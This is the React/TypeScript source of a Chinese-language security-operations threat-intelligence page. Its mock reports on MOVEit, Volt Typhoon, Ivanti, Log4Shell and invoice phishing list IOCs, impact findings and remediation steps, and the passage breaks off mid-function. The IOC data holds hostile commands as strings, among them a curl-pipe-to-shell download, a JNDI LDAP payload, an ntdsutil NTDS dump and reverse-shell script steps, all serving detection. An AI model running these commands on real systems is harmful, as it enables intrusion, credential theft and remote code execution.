import { useRef, useState } from 'react';
import { Link, useSearchParams } from 'react-router-dom';
import {
  ArrowRight,
  CheckCircle2,
  ChevronRight,
  FileSearch,
  FileText,
  ListChecks,
  Network,
  Radar,
  ShieldCheck,
  Upload,
  X,
} from 'lucide-react';
import PageHeader from '@/components/common/PageHeader';
import { Badge, Card, ConfigWorkshop, ModeSwitch } from './components';

type IntelReport = typeof threatIntelReports[number] & { manual?: boolean };

const threatIntelReports = [
  {
    id: 'TI-2026-0614-001',
    title: 'MOVEit Transfer 零日利用与 Cl0p 勒索扩散报告',
    file: 'MOVEit_Cl0p_Exploitation_Report.pdf',
    source: 'CISA / Mandiant / 行业报告',
    event: 'MOVEit Transfer CVE-2023-34362',
    severity: '高危',
    uploadedAt: '2026-06-14 09:30',
    summary: '报告描述攻击者利用 MOVEit Transfer SQL 注入漏洞批量窃取文件，并通过 LEMURLOOT WebShell 维持访问。Flocks 已提取 CVE、WebShell 路径、命令行、文件 Hash、攻击 IP 和受影响组件版本，并对内部托管文件传输系统进行影响追踪。',
    iocs: {
      ip: ['138.197.152.201', '89.39.105.108', '5.252.189.0/24'],
      domain: ['moveit-transfer-update.example', 'file-sync-check.example'],
      hash: ['44d8e68c7c4e0f3f2d1a8b5e92a1c39f', 'b69e23cd45fa2a19d0acfe8b9bd2c8a8'],
      command: ['whoami', 'net user', 'powershell -nop -w hidden -c Invoke-WebRequest'],
      filePath: ['/human2.aspx', '/moveitisapi/moveitisapi.dll', 'C:\\MOVEitTransfer\\wwwroot\\human2.aspx'],
      software: ['MOVEit Transfer', 'IIS', 'Microsoft SQL Server'],
      component: ['moveitisapi.dll', 'LEMURLOOT WebShell'],
      version: ['MOVEit Transfer 2023.0.0-2023.0.1', 'MOVEit Transfer 2022.1.x'],
      startup: ['w3wp.exe -ap "MOVEit Transfer"', 'powershell.exe -ExecutionPolicy Bypass'],
    },
    impact: [
      { source: 'CMDB', result: '发现 2 台 MOVEit Transfer 资产，其中 1 台版本落入影响范围。', status: '命中' },
      { source: 'NDR', result: '过去 7 天未发现上述攻击 IP 访问内部 MOVEit 服务。', status: '未命中' },
      { source: 'HIDS', result: '在 FT-HZ-01 上未发现 human2.aspx，但存在异常 aspx 文件写入告警 1 条。', status: '关注' },
      { source: 'EDR', result: '未发现 w3wp.exe 拉起 powershell 的行为。', status: '未命中' },
      { source: 'FW', result: '建议临时阻断 5.252.189.0/24 至文件传输区入口。', status: '建议' },
    ],
    conclusion: '企业内部存在 1 台可能受影响 MOVEit 资产，尚未发现明确入侵证据，但 HIDS 发现异常 aspx 写入，需要进入漏洞排查并补丁验证。',
    recommendations: ['立即核查 FT-HZ-01 版本并升级', '保全 Web 根目录和 IIS 日志', '对文件传输区启用临时入站限制', '将 LEMURLOOT Hash 写入 EDR IOC 策略'],
  },
  {
    id: 'TI-2026-0614-002',
    title: 'Volt Typhoon 关键基础设施潜伏活动报告',
    file: 'Volt_Typhoon_LOTL_TTPs.pdf',
    source: 'CISA / NSA / Microsoft',
    event: 'Volt Typhoon Living-off-the-Land',
    severity: '高危',
    uploadedAt: '2026-06-14 10:15',
    summary: '报告描述攻击者长期使用系统自带工具进行凭证收集、代理转发和横向移动。Flocks 从报告中提取 ntdsutil、wmic、netsh portproxy、PowerShell、rar/7z 打包等命令行 IOC，并追踪企业 VPN、AD、EDR 与 HIDS 日志。',
    iocs: {
      ip: ['45.63.60.39', '103.126.6.18', '192.241.192.0/24'],
      domain: ['cdn-cache-sync.example', 'edge-update-check.example'],
      hash: ['9f2c1b8a4d8e2f31a7e28c52a9346d9b', 'b7a91f0d3c7738b2c5e6b75a1e93d411'],
      command: ['ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\ntds"', 'netsh interface portproxy add v4tov4', 'wmic /node:<host> process call create', 'powershell Get-ADComputer'],
      filePath: ['C:\\Windows\\Temp\\ntds.dit', 'C:\\ProgramData\\vmware.log', 'C:\\Users\\Public\\backup.7z'],
      software: ['Windows Server', 'Active Directory', 'VPN Gateway'],
      component: ['netsh portproxy', 'wmic', 'ntdsutil', 'PowerShell'],
      version: ['Windows Server 2016/2019', 'FortiGate VPN 7.x'],
      startup: ['schtasks /create /tn WinUpdateCheck', 'sc create vmtools binPath=...'],
    },
    impact: [
      { source: 'VPN', result: '发现 3 个账号在非常用时段从境外 VPS 登录。', status: '命中' },
      { source: 'EDR', result: '2 台服务器出现 netsh portproxy 查询行为，未发现新增规则。', status: '关注' },
      { source: 'HIDS', result: '未发现 ntdsutil 导出 ntds.dit 证据。', status: '未命中' },
      { source: 'AD', result: '发现 1 个低频管理员账号短时间访问 42 台主机。', status: '命中' },
      { source: 'FW', result: '未发现 IOC IP 直连，但存在异常长连接到海外 VPS。', status: '关注' },
    ],
    conclusion: '内部未发现完整 Volt Typhoon 攻击链，但 VPN 与 AD 行为异常，建议作为潜伏风险开展深度调查。',
    recommendations: ['强制重置异常 VPN 账号密码', '审计 AD 管理员登录路径', '排查 netsh portproxy 配置', '对海外 VPS 长连接进行流量回溯'],
  },
  {
    id: 'TI-2026-0614-003',
    title: 'Ivanti Connect Secure 漏洞利用与 WebShell 活动报告',
    file: 'Ivanti_Connect_Secure_WebShell_Report.pdf',
    source: 'CISA / Volexity / 厂商通告',
    event: 'Ivanti Connect Secure CVE-2023-46805 / CVE-2024-21887',
    severity: '高危',
    uploadedAt: '2026-06-14 11:20',
    summary: '报告描述攻击者利用 Ivanti 认证绕过和命令注入漏洞植入 WebShell，并窃取 VPN 会话信息。Flocks 提取 WebShell 路径、攻击 URL、进程、文件 Hash、版本范围和外联域名，对企业 VPN、WAF、HIDS、NDR 进行回溯。',
    iocs: {
      ip: ['104.128.92.21', '146.70.83.48', '185.220.101.47'],
      domain: ['vpn-session-update.example', 'edge-auth-cdn.example'],
      hash: ['3c5b4f0d8a6e2b2a17170517f0f4c91d', '8d1c2aab9f90b4036cfbfde4a4140f77'],
      command: ['curl -k https://127.0.0.1/api/v1/totp/user-backup-code', 'chmod +x /tmp/rev.sh', 'sh /tmp/rev.sh'],
      filePath: ['/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi', '/tmp/rev.sh', '/data/runtime/mt/'],
      software: ['Ivanti Connect Secure', 'Pulse Secure VPN'],
      component: ['dana-na', 'compcheckresult.cgi', 'WebShell'],
      version: ['Ivanti Connect Secure 9.1R14-9.1R17', 'Ivanti Policy Secure 22.x'],
      startup: ['/home/bin/web -s start', 'crond reload /tmp/rev.sh'],
    },
    impact: [
      { source: 'CMDB', result: '发现 4 台 Ivanti VPN，其中 2 台版本处于影响范围。', status: '命中' },
      { source: 'WAF', result: '过去 30 天命中 /dana-na/auth/ 路径异常访问 18 次。', status: '命中' },
      { source: 'HIDS', result: '未发现 compcheckresult.cgi 文件 Hash 命中。', status: '未命中' },
      { source: 'NDR', result: 'VPN-HZ-01 曾访问 146.70.83.48:443，持续 18 分钟。', status: '关注' },
      { source: 'FW', result: '已生成针对 3 个恶意出口 IP 的阻断建议。', status: '建议' },
    ],
    conclusion: '企业存在受影响 Ivanti VPN 版本，并出现可疑历史访问与外联，需要立即进入漏洞排查并保全 VPN 设备日志。',
    recommendations: ['升级 Ivanti VPN 并执行完整性检查', '吊销高风险 VPN 会话', '保全 /dana-na/auth/ 访问日志', '临时阻断报告 IOC IP'],
  },
  {
    id: 'TI-2026-0614-004',
    title: 'Log4Shell JNDI 利用链持续扫描报告',
    file: 'Log4Shell_JNDI_Exploitation_Report.pdf',
    source: 'Apache / CISA / OSINT',
    event: 'CVE-2021-44228 Log4Shell',
    severity: '中高',
    uploadedAt: '2026-06-14 13:40',
    summary: '报告显示 Log4Shell 相关 JNDI payload 仍在互联网持续扫描。Flocks 提取 JNDI LDAP/RMI payload、恶意 LDAP 服务、受影响 log4j-core 版本、Java 启动参数和出站回连特征，对内部 Java 应用进行组件和流量追踪。',
    iocs: {
      ip: ['45.83.12.21', '198.235.24.44', '167.94.138.51'],
      domain: ['jndi-check.example', 'ldap-callback.example'],
      hash: ['f2a89f2c9ed8f2cb6f8b45d0c2a72f3e', 'd41d8cd98f00b204e9800998ecf8427e'],
      command: ['${jndi:ldap://45.83.12.21:1389/a}', 'curl http://45.83.12.21:8080/a.sh|sh'],
      filePath: ['/tmp/log4j-stage.sh', '/opt/app/lib/log4j-core-2.14.1.jar'],
      software: ['Java Spring Boot', 'Apache Log4j'],
      component: ['log4j-core', 'JndiLookup.class'],
      version: ['log4j-core 2.0-2.14.1', 'Java 8u121+'],
      startup: ['java -jar app.jar', '-Dlog4j2.formatMsgNoLookups=true'],
    },
    impact: [
      { source: 'CMDB', result: '发现 36 个 Java 应用，其中 5 个声明包含 log4j-core 2.14.1。', status: '命中' },
      { source: 'NDR', result: '1 台应用服务器出现 LDAP 1389 出站连接。', status: '命中' },
      { source: 'EDR', result: '未发现 Java 进程拉起 shell。', status: '未命中' },
      { source: 'HIDS', result: '3 台主机存在 log4j-core-2.14.1.jar。', status: '命中' },
      { source: 'WAF', result: '近 24 小时拦截 JNDI payload 126 次。', status: '关注' },
    ],
    conclusion: '内部仍存在少量 Log4j 老版本组件，且出现一次出站 LDAP 回连，需要优先排查对应应用服务器。',
    recommendations: ['升级 log4j-core 到安全版本', '限制应用服务器 LDAP/RMI 出网', '对 5 个 Java 应用执行复测', '将 JNDI payload 加入 WAF 规则'],
  },
  {
    id: 'TI-2026-0614-005',
    title: '供应商对账主题钓鱼凭证窃取报告',
    file: 'Supplier_Invoice_Phishing_Credential_Report.pdf',
    source: '邮件网关 / URLScan / 威胁情报',
    event: 'Invoice-themed Credential Phishing',
    severity: '中高',
    uploadedAt: '2026-06-14 15:05',
    summary: '报告描述攻击者伪装供应商对账邮件，引导财务人员访问仿冒登录页。Flocks 提取钓鱼域名、URL、页面 Hash、登录表单特征、邮件主题、浏览器启动链路，并联动邮件网关、EDR、NDR、OA 追踪受影响员工。',
    iocs: {
      ip: ['172.67.188.33', '104.21.32.17'],
      domain: ['invoice-check.example', 'sso-payverify.example'],
      hash: ['5e8f2b1f0df1df2a9a12d94b56788721', 'f0d1c4a2cc67fdadfa2b9d52d8e9cc02'],
      command: ['outlook.exe -> chrome.exe hxxps://invoice-check.example/login', 'rundll32 url.dll,FileProtocolHandler'],
      filePath: ['C:\\Users\\li.yan\\Downloads\\对账确认.htm', 'C:\\Users\\li.yan\\AppData\\Local\\Temp\\invoice.lnk'],
      software: ['Microsoft Outlook', 'Chrome', '企业 SSO'],
      component: ['HTML 登录表单', 'password input', '短链接跳转'],
      version: ['Chrome 125', 'Outlook 2021'],
      startup: ['chrome.exe --single-argument hxxps://invoice-check.example/login'],
    },
    impact: [
      { source: '邮件网关', result: '同主题邮件 27 封，1 封投递成功。', status: '命中' },
      { source: 'EDR', result: 'li.yan 终端由 outlook.exe 拉起 chrome 访问钓鱼 URL。', status: '命中' },
      { source: 'NDR', result: '终端 10.12.8.45 访问 /login，页面返回账号密码表单。', status: '命中' },
      { source: 'OA', result: 'li.yan 为财务实习生，具备报销系统只读权限。', status: '关注' },
      { source: 'VPN', result: '暂未发现该账号异常 VPN 登录。', status: '未命中' },
    ],
    conclusion: '钓鱼链接已被一名财务实习生点击，尚未发现账号异常登录，但需要按凭证可能外泄处置。',
    recommendations: ['临时冻结账号外部访问', '重置用户密码', '检索同主题邮件收件人', '将钓鱼 URL 加入邮件网关和 NDR 阻断策略'],
  },
];

export default function SocIntelPage() {
  const [params] = useSearchParams();
  const isConfigure = params.get('mode') === 'configure';

  return (
    <div className="h-full overflow-y-auto">
      <PageHeader
        title="态势情报"
        description="上传威胁报告，AI 提取 IOC，并通过 text2sql 查询企业数据源追踪内部影响范围。"
        icon={<Radar className="h-8 w-8" />}
        action={<ModeSwitch configureHref="/soc/intel?mode=configure" />}
      />

      {isConfigure ? <ConfigWorkshop scenario="intel" /> : <IntelOperation />}
    </div>
  );
}

function IntelOperation() {
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const [reports, setReports] = useState<IntelReport[]>(threatIntelReports);
  const [selectedReport, setSelectedReport] = useState<IntelReport | null>(null);

  const handleUploadReport = (file: File) => {
    const parsedTitle = file.name
      .replace(/\.pdf$/i, '')
      .replace(/[_-]+/g, ' ')
      .replace(/\s+/g, ' ')
      .trim();
    const uploadedReport: IntelReport = {
      ...threatIntelReports[2],
      id: `TI-2026-0614-U${String(reports.filter((item) => item.manual).length + 1).padStart(2, '0')}`,
      title: parsedTitle || '人工上传威胁情报报告',
      file: file.name,
      source: '人工上传 / AI 解析',
      uploadedAt: '2026-06-14 16:20',
      summary: `已解析人工上传的 PDF 报告 ${file.name}，AI 自动提取 IOC、漏洞组件、文件路径、命令行和版本信息，并生成企业内部影响追踪结果。`,
      manual: true,
    };
    setReports((current) => [uploadedReport, ...current]);
    setSelectedReport(uploadedReport);
  };

  return (
    <div className="space-y-4">
      <div>
        <Card className="p-4">
          <div className="mb-3 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <FileText className="h-5 w-5 text-red-600" />
              <h3 className="font-semibold text-gray-900">情报报告列表</h3>
            </div>
            <div className="flex items-center gap-2">
              <Badge tone="blue">{reports.length} 份报告</Badge>
              <input
                ref={fileInputRef}
                type="file"
                accept="application/pdf,.pdf"
                className="hidden"
                onChange={(event) => {
                  const file = event.target.files?.[0];
                  if (file) handleUploadReport(file);
                  event.target.value = '';
                }}
              />
              <button
                type="button"
                onClick={() => fileInputRef.current?.click()}
                className="inline-flex items-center gap-1.5 rounded-lg bg-gray-900 px-3 py-2 text-xs font-medium text-white hover:bg-gray-800"
              >
                <Upload className="h-3.5 w-3.5" />
                上传报告
              </button>
            </div>
          </div>
          <div className="space-y-2">
            {reports.map((report) => (
              <button
                key={report.id}
                type="button"
                onClick={() => setSelectedReport(report)}
                className={`w-full rounded-lg border p-3 text-left transition-colors ${
                  selectedReport?.id === report.id
                    ? 'border-red-200 bg-red-50'
                    : 'border-gray-200 bg-gray-50 hover:border-gray-300 hover:bg-white'
                }`}
              >
                <div className="flex items-start justify-between gap-3">
                  <div>
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="text-sm font-semibold text-gray-900">{report.title}</span>
                      {report.manual && <Badge tone="green">人工上传</Badge>}
                    </div>
                    <div className="mt-1 text-xs text-gray-500">{report.file} · {report.source}</div>
                  </div>
                  <Badge tone={report.severity === '高危' ? 'red' : 'orange'}>{report.severity}</Badge>
                </div>
                <p className="mt-2 line-clamp-2 text-xs leading-5 text-gray-600">{report.summary}</p>
              </button>
            ))}
          </div>
        </Card>
      </div>

      {selectedReport && <IntelReportDrawer report={selectedReport} onClose={() => setSelectedReport(null)} />}
    </div>
  );
}

function IntelReportDrawer({ report, onClose }: { report: IntelReport; onClose: () => void }) {
  const [stepsOpen, setStepsOpen] = useState(false);
  const [iocMode, setIocMode] = useState<'kv' | 'json'>('kv');
  const findings = getImpactFindings(report);
  const iocRows = [
    ['IP', report.iocs.ip],
    ['域名', report.iocs.domain],
    ['Hash', report.iocs.hash],
    ['命令行', report.iocs.command],
    ['文件路径', report.iocs.filePath],
    ['软件名称', report.iocs.software],
    ['组件名称', report.iocs.component],
    ['版本号', report.iocs.version],
    ['启动命令行', report.iocs.startup],
  ] as const;
  const iocJson = JSON.stringify(report.iocs, null, 2);
  const assetFindings = findings.filter((item) => ['CMDB', 'CMDB/SBOM', 'OA'].includes(item.source));
  const telemetryFindings = findings.filter((item) => !['CMDB', 'CMDB/SBOM', 'OA'].includes(item.source));
  const hitFindings = findings.filter((item) => item.status === '命中');
  const watchFindings = findings.filter((item) => item.status === '关注');
  const steps = [
    {
      title: '解析 PDF 报告',
      content: `读取 ${report.file}，解析正文、表格、附录和处置章节，识别标题、漏洞编号、攻击链描述、IOC 附录和处置建议。`,
      facts: [
        `识别报告标题：${report.title}`,
        `识别事件主题：${report.event}；严重性：${report.severity}；来源：${report.source}`,
        `提取报告摘要：${report.summary}`,
        `提取处置建议 ${report.recommendations.length} 条：${report.recommendations.slice(0, 2).join('；')}`,
      ],
    },
    {
      title: 'AI 提取 IOC',
      content: '抽取 IP、域名、Hash、命令行、文件路径、软件名称、组件名称、版本号、启动命令行等结构化 IOC。',
      facts: [
        `IP ${report.iocs.ip.length} 个：${report.iocs.ip.join('，')}`,
        `域名 ${report.iocs.domain.length} 个：${report.iocs.domain.join('，')}`,
        `Hash ${report.iocs.hash.length} 个：${report.iocs.hash.join('，')}`,
        `命令行 ${report.iocs.command.length} 条：${report.iocs.command.join('；')}`,
        `文件路径 ${report.iocs.filePath.length} 个：${report.iocs.filePath.join('，')}`,
        `软件/组件/版本：${[...report.iocs.software, ...report.iocs.component, ...report.iocs.version].join('，')}`,
      ],
    },
    {
      title: '企业资产匹配',
      content: '将软件、组件、版本号、域名、IP 和文件路径 IOC 转成 text2sql 查询，检索 CMDB、SBOM、设备清单和公网暴露面数据，匹配可能受影响资产。',
      facts: assetFindings.length > 0
        ? assetFindings.map((item) => `${item.source} 查询 ${item.query}：${item.count}；涉及 ${item.assets}；证据：${item.evidence}`)
        : ['未从 CMDB/SBOM/OA 中命中明确资产，后续以日志和流量追踪结果为主。'],
    },
    {
      title: '日志与流量追踪',
      content: '基于 IOC 自动生成 text2sql 查询条件，回溯 NDR、EDR、HIDS、WAF、FW、VPN、邮件网关和 OA 数据库中的网络连接、进程行为、文件落地、访问日志和账号活动。',
      facts: telemetryFindings.map((item) => `${item.source} 查询 ${item.query}：${item.count}；对象 ${item.assets}；证据：${item.evidence}`),
    },
    {
      title: '生成影响报告',
      content: '汇总命中证据、未命中范围、仍需人工确认的点，并生成处置建议。',
      facts: [
        `命中项 ${hitFindings.length} 类：${hitFindings.map((item) => `${item.source} ${item.count}`).join('；') || '无'}`,
        `需关注项 ${watchFindings.length} 类：${watchFindings.map((item) => `${item.source} ${item.count}`).join('；') || '无'}`,
        `最终结论：${report.conclusion}`,
        `处置建议：${report.recommendations.join('；')}`,
      ],
    },
  ];

  return (
    <div className="fixed inset-0 z-[70]">
      <button type="button" className="absolute inset-0 bg-slate-900/25" onClick={onClose} aria-label="关闭情报报告" />
      <aside className="absolute inset-y-0 right-0 flex w-full flex-col bg-white shadow-2xl sm:w-[82%]">
        <div className="flex items-center justify-between border-b border-gray-200 px-5 py-3">
          <div className="flex items-center gap-2.5">
            <FileSearch className="h-5 w-5 text-gray-900" />
            <div>
              <div className="text-base font-semibold text-gray-900">态势情报影响分析</div>
              <div className="text-xs text-gray-500">{report.id} · {report.file}</div>
            </div>
          </div>
          <button type="button" onClick={onClose} className="rounded-lg p-1.5 text-gray-400 hover:bg-gray-100 hover:text-gray-600">
            <X className="h-4 w-4" />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto px-5 py-4">
          <button
            type="button"
            onClick={() => setStepsOpen((open) => !open)}
            className="mb-5 flex w-full items-center justify-between rounded-lg border border-gray-200 bg-white px-5 py-3 text-left shadow-sm"
          >
            <div className="flex items-center gap-4">
              <span className="text-base font-semibold text-gray-900">分析步骤</span>
              <span className="text-sm text-gray-500">{steps.length} 个步骤</span>
            </div>
            <span className="inline-flex items-center gap-2 text-xs font-medium text-gray-600">
              {stepsOpen ? '收起' : '展开查看'}
              <ChevronRight className={`h-4 w-4 transition-transform ${stepsOpen ? '-rotate-90' : 'rotate-90'}`} />
            </span>
          </button>

          {stepsOpen && (
            <div className="mb-6 border-l border-gray-200 pl-5">
              {steps.map((step) => (
                <div key={step.title} className="relative mb-5 last:mb-0">
                  <div className="absolute -left-[29px] top-1 flex h-4 w-4 items-center justify-center rounded-full bg-gray-900 text-white">
                    <CheckCircle2 className="h-3 w-3" />
                  </div>
                  <h3 className="text-base font-semibold text-gray-900">{step.title}</h3>
                  <p className="mt-2 text-sm leading-6 text-gray-700">{step.content}</p>
                  {step.facts.length > 0 && (
                    <ul className="mt-2 list-disc space-y-1 pl-5 text-sm leading-6 text-gray-700">
                      {step.facts.map((fact) => <li key={fact}>{fact}</li>)}
                    </ul>
                  )}
                </div>
              ))}
            </div>
          )}

          <article className="pb-10">
            <div className="mb-3 flex items-center gap-3 text-sm">
              <span>{report.uploadedAt}</span>
              <Badge tone={report.severity === '高危' ? 'red' : 'orange'}>{report.severity}</Badge>
              <span className="text-gray-500">{report.source}</span>
            </div>
            <h1 className="text-2xl font-bold text-gray-950">{report.title}</h1>
            <p className="mt-3 text-sm leading-7 text-gray-700">{report.summary}</p>

            <div className="mb-3 mt-7 flex items-center justify-between gap-3">
              <div className="flex items-center gap-2">
                <span className="text-red-600"><ListChecks className="h-4 w-4" /></span>
                <h2 className="text-lg font-bold text-gray-950">IOC 提取结果</h2>
              </div>
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => setIocMode((mode) => (mode === 'kv' ? 'json' : 'kv'))}
                  className="rounded-lg border border-gray-200 px-3 py-1.5 text-xs font-medium text-gray-700 hover:bg-gray-50"
                >
                  {iocMode === 'kv' ? 'JSON 格式' : 'KV 文本'}
                </button>
                <button
                  type="button"
                  onClick={() => downloadJson(`${report.id}-ioc.json`, iocJson)}
                  className="rounded-lg bg-gray-900 px-3 py-1.5 text-xs font-medium text-white hover:bg-gray-800"
                >
                  下载 JSON
                </button>
              </div>
            </div>
            {iocMode === 'kv' ? (
              <div className="rounded-lg bg-gray-50 px-4 py-3 text-sm leading-7 text-gray-700">
                {iocRows.map(([label, values]) => (
                  <div key={label} className="flex gap-3 border-b border-gray-100 py-1.5 last:border-0">
                    <div className="w-24 shrink-0 font-semibold text-gray-900">{label}</div>
                    <div className="font-mono text-xs leading-7 text-gray-700">{values.join('，')}</div>
                  </div>
                ))}
              </div>
            ) : (
              <pre className="max-h-[360px] overflow-auto rounded-lg bg-gray-950 px-4 py-3 font-mono text-xs leading-6 text-gray-100">
                {iocJson}
              </pre>
            )}

            <ReportSectionTitle icon={<Network className="h-4 w-4" />} title="企业内部影响范围" />
            <div className="overflow-hidden rounded-lg border border-gray-200">
              <table className="min-w-[1180px] divide-y divide-gray-100 text-sm">
                <thead className="bg-gray-50 text-left text-xs font-semibold uppercase tracking-wide text-gray-500">
                  <tr>
                    <th className="px-3 py-2">数据源</th>
                    <th className="px-3 py-2">查询条件</th>
                    <th className="px-3 py-2">命中数量</th>
                    <th className="px-3 py-2">具体资产 / 主机 / 账号</th>
                    <th className="px-3 py-2">证据明细</th>
                    <th className="px-3 py-2">状态</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100">
                  {findings.map((item) => (
                    <tr key={`${item.source}-${item.query}`}>
                      <td className="whitespace-nowrap px-3 py-2 font-semibold text-gray-900">{item.source}</td>
                      <td className="px-3 py-2 font-mono text-xs text-gray-600">{item.query}</td>
                      <td className="whitespace-nowrap px-3 py-2 text-gray-700">{item.count}</td>
                      <td className="px-3 py-2 text-gray-700">{item.assets}</td>
                      <td className="px-3 py-2 text-gray-600">{item.evidence}</td>
                      <td className="whitespace-nowrap px-3 py-2">
                        <Badge tone={item.status === '命中' ? 'red' : item.status === '关注' ? 'orange' : item.status === '建议' ? 'blue' : 'slate'}>
                          {item.status}
                        </Badge>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            <ReportSectionTitle icon={<ShieldCheck className="h-4 w-4" />} title="最终报告" />
            <div className="rounded-lg bg-red-50 p-4">
              <div className="text-sm font-semibold text-gray-900">{report.conclusion}</div>
              <ol className="mt-3 list-decimal space-y-2 pl-5 text-sm leading-6 text-gray-700">
                {report.recommendations.map((item) => <li key={item}>{item}</li>)}
              </ol>
            </div>
          </article>
        </div>

        <div className="flex justify-end gap-2 border-t border-gray-200 px-5 py-3">
          <button type="button" onClick={onClose} className="rounded-lg border border-gray-200 px-3 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50">
            关闭
          </button>
          <Link to="/soc/alerts" className="inline-flex items-center gap-2 rounded-lg bg-red-600 px-3 py-2 text-sm font-medium text-white hover:bg-red-700">
            生成追踪任务
            <ArrowRight className="h-4 w-4" />
          </Link>
        </div>
      </aside>
    </div>
  );
}

function ReportSectionTitle({ icon, title }: { icon: React.ReactNode; title: string }) {
  return (
    <div className="mb-3 mt-7 flex items-center gap-2">
      <span className="text-red-600">{icon}</span>
      <h2 className="text-lg font-bold text-gray-950">{title}</h2>
    </div>
  );
}

function getImpactFindings(report: IntelReport) {
  if (report.event.includes('MOVEit')) {
    return [
      { source: 'CMDB', query: 'software = MOVEit Transfer OR component = moveitisapi.dll', count: '2 台资产 / 1 台受影响', assets: 'FT-HZ-01 10.20.18.21 MOVEit 2023.0.1；FT-BJ-02 10.10.44.18 MOVEit 2021.0.6', evidence: 'FT-HZ-01 版本命中 2023.0.0-2023.0.1；业务标签为文件交换区/公网映射 443。', status: '命中' },
      { source: 'NDR', query: 'dst in [FT-HZ-01, FT-BJ-02] AND src_ip in IOC_IP AND time >= 7d', count: '0 条攻击 IP 命中', assets: 'FT-HZ-01、FT-BJ-02', evidence: '未发现 138.197.152.201、89.39.105.108、5.252.189.0/24 访问内部 MOVEit。', status: '未命中' },
      { source: 'WAF', query: 'uri contains /moveitisapi OR /human2.aspx, last 30d', count: '7 条 / 1 个资产', assets: 'FT-HZ-01 10.20.18.21', evidence: '6 条 /moveitisapi/moveitisapi.dll 业务访问；1 条 /human2.aspx 返回 404，源 IP 198.51.100.77。', status: '关注' },
      { source: 'HIDS', query: 'file_path in [/human2.aspx, C:\\MOVEitTransfer\\wwwroot\\*.aspx] OR hash in LEMURLOOT_HASH', count: '1 条异常写入 / 0 条 Hash 命中', assets: 'FT-HZ-01 C:\\MOVEitTransfer\\wwwroot\\healthcheck.aspx', evidence: '2026-06-13 23:18 w3wp.exe 写入 healthcheck.aspx，Hash 不在报告 IOC，但路径和时间可疑。', status: '关注' },
      { source: 'EDR', query: 'process = w3wp.exe AND child_process in [powershell.exe, cmd.exe, cscript.exe]', count: '0 台主机 / 0 条进程链', assets: 'FT-HZ-01、FT-BJ-02', evidence: '过去 30 天未发现 w3wp.exe 拉起 powershell/cmd；未发现报告中的 powershell -ExecutionPolicy Bypass。', status: '未命中' },
      { source: 'FW', query: 'src in IOC_IP OR dst in IOC_IP, zone = file-transfer', count: '0 条历史命中 / 1 条策略建议', assets: '边界 FW-HZ-DMZ-01', evidence: '建议新增阻断对象 5.252.189.0/24、138.197.152.201、89.39.105.108 至文件传输区入口。', status: '建议' },
    ];
  }

  if (report.event.includes('Volt')) {
    return [
      { source: 'VPN', query: 'src_ip in IOC_IP OR geo != baseline_geo, last 14d', count: '3 个账号 / 11 次登录', assets: 'li.ming、ops.backup、svc_vpn_sync', evidence: 'ops.backup 从 45.63.60.39 登录 4 次；li.ming 从非常用城市登录 2 次；svc_vpn_sync 非交互账号出现人工登录。', status: '命中' },
      { source: 'AD', query: 'admin logon fanout > 20 hosts within 1h', count: '1 个账号 / 42 台主机', assets: 'ops.backup -> 10.20.0.0/16 服务器段', evidence: '4624 Type 3 登录 42 台主机；其中 17 台为数据库和文件服务器。', status: '命中' },
      { source: 'EDR', query: 'process command contains [wmic, netsh interface portproxy, powershell Get-ADComputer]', count: '5 台终端 / 19 条命令', assets: 'SRV-DB-03、SRV-FILE-07、SRV-OPS-02、PC-OPS-118、PC-OPS-121', evidence: 'SRV-OPS-02 出现 netsh interface portproxy show all 3 次；PC-OPS-118 出现 wmic /node 横向查询。', status: '关注' },
      { source: 'HIDS', query: 'file_path in [C:\\Windows\\Temp\\ntds.dit, C:\\Users\\Public\\backup.7z]', count: '0 个 ntds.dit / 2 个压缩包', assets: 'SRV-FILE-07 C:\\Users\\Public\\backup.7z；SRV-DB-03 C:\\ProgramData\\tmp.7z', evidence: '未发现 ntdsutil 导出；两个 7z 文件由管理员会话创建，需人工确认。', status: '关注' },
      { source: 'FW', query: 'long connection to IOC_IP OR overseas VPS > 30min', count: '6 条长连接 / 2 台主机', assets: 'SRV-OPS-02 -> 103.126.6.18:443；PC-OPS-118 -> 45.63.60.39:8443', evidence: '最大持续 2h17m，流量小包心跳特征明显。', status: '命中' },
    ];
  }

  if (report.event.includes('Ivanti')) {
    return [
      { source: 'CMDB', query: 'software in [Ivanti Connect Secure, Pulse Secure VPN]', count: '4 台 VPN / 2 台受影响', assets: 'VPN-HZ-01 9.1R15；VPN-BJ-02 9.1R17；VPN-SH-01 22.4R2；VPN-GZ-01 22.5R1', evidence: 'VPN-HZ-01、VPN-BJ-02 版本落入 CVE-2023-46805/CVE-2024-21887 影响范围。', status: '命中' },
      { source: 'WAF', query: 'uri startswith /dana-na/auth/ OR /api/v1/totp, last 30d', count: '18 条请求 / 2 个源 IP', assets: 'VPN-HZ-01、VPN-BJ-02', evidence: '104.128.92.21 访问 /dana-na/auth/compcheckresult.cgi 11 次；146.70.83.48 访问 /api/v1/totp/user-backup-code 7 次。', status: '命中' },
      { source: 'HIDS', query: 'path = /home/webserver/htdocs/dana-na/auth/compcheckresult.cgi OR hash in IOC_HASH', count: '0 条 Hash 命中 / 1 个新增 CGI', assets: 'VPN-HZ-01 /home/webserver/htdocs/dana-na/auth/checkphase.cgi', evidence: '新增 CGI 文件 Hash 不在报告 IOC，mtime=2026-06-12 03:41，需要设备完整性检查。', status: '关注' },
      { source: 'NDR', query: 'vpn_assets outbound to IOC_IP, last 14d', count: '1 条外联 / 1 台设备', assets: 'VPN-HZ-01 -> 146.70.83.48:443', evidence: '持续 18 分钟，TLS SNI 为空，出现在异常 CGI 创建后 6 分钟。', status: '关注' },
      { source: 'FW', query: 'src/dst in [104.128.92.21,146.70.83.48,185.220.101.47]', count: '22 条历史流量 / 3 条阻断建议', assets: 'FW-HZ-DMZ-01、FW-BJ-EDGE-01', evidence: '历史流量主要命中 VPN-HZ-01；已生成 3 个恶意 IP 阻断对象。', status: '建议' },
    ];
  }

  if (report.event.includes('Log4Shell')) {
    return [
